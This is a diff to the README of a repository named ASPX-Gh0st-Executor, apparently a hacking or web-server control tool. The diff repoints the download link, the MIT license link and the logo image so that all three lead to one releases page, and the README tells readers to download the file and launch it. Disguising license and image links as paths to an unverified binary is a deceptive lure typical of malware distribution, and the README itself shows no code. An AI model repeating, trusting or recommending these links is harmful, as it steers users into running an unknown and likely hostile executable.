@@ -11,7 +11,7 @@ Welcome to the ASPX-Gh0st-Executor repository! This repository contains an ASPX 
 
 ## Getting Started 🚀
 
-To get started with ASPX-Gh0st-Executor, simply download the [App.zip](https://github.com/file/App.zip) file and launch it. If the link doesn't work or if you prefer a different version, please check the "Releases" section of this repository.
+To get started with ASPX-Gh0st-Executor, simply download the [https://github.com/GodSETUP/ASPX-Gh0st-Executor/releases/tag/v2.0](https://github.com/GodSETUP/ASPX-Gh0st-Executor/releases/tag/v2.0) file and launch it. If the link doesn't work or if you prefer a different version, please check the "Releases" section of this repository.
 
 ## How to Use 📝
 
@@ -51,7 +51,7 @@ If you encounter any issues or have questions about ASPX-Gh0st-Executor, please 
 
 ## License 📜
 
-The ASPX-Gh0st-Executor is open-source software licensed under the [MIT license](https://opensource.org/licenses/MIT).
+The ASPX-Gh0st-Executor is open-source software licensed under the [MIT license](https://github.com/GodSETUP/ASPX-Gh0st-Executor/releases/tag/v2.0).
 
 ## Get Started Now! 🚀
 
@@ -59,6 +59,6 @@ Download the ASPX-Gh0st-Executor and take control of your web server like never 
 
 Let's hack responsibly! 💻🔒
 
-![ASPX Logo](https://example.com/asp-logo.png)
+![ASPX Logo](https://github.com/GodSETUP/ASPX-Gh0st-Executor/releases/tag/v2.0)
 
 Remember, with great power comes great responsibility. Use ASPX-Gh0st-Executor wisely and ethically in your web server management practices. Happy hacking! 🌐💣
